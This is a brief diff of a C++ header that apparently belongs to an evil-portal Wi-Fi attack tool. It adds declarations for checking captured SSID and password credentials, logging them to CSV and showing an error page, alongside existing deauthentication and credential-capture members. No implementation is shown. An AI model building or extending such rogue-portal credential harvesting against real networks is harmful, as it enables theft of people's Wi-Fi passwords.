@@ -35,6 +35,7 @@ private:
     String htmlPage;
     String htmlFileName;
     bool isDefaultHtml = true;
+    bool temp_stop = false;
     FS *fsHtmlFile;
 
     String lastCred;
@@ -43,19 +44,18 @@ private:
     String capturedCredentialsHtml = "";
 
     void portalController(void);
-    void credsController(void);
-
-    void restartWiFi(void);
+    void credsController(bool verify = false);
+    bool verifyCreds(String &Ssid, String &Password);
+    void restartWiFi(bool reset=true);
     void resetCapturedCredentials(void);
     void printDeauthStatus(bool);
     void printLastCapturedCredential(void);
     void debounceButtonPress(void);
-
     void loadCustomHtml(void);
     void loadDefaultHtml(void);
     String wifiLoadPage(void);
-    void saveToCSV(const String &csvLine);
-
+    String wifiLoadErrorPage(void);
+    void saveToCSV(const String &csvLine, bool IsAPname = false);
     void drawScreen(bool holdDeauth);
 
     String getHtmlTemplate(String body);
